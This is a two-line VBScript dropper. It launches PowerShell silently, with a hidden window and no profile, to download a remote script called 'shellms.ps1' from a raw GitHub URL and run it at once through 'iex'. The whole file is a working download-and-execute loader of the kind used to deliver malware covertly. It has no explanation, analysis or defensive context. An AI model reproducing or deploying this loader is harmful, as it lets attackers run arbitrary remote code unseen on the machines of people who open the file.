Set ws = CreateObject("WScript.Shell")
ws.Run "powershell -w hidden -nop -c ""curl.exe -s https://raw.githubusercontent.com/joaosetti98/sa/refs/heads/main/shellms.ps1 | iex""", 0, False
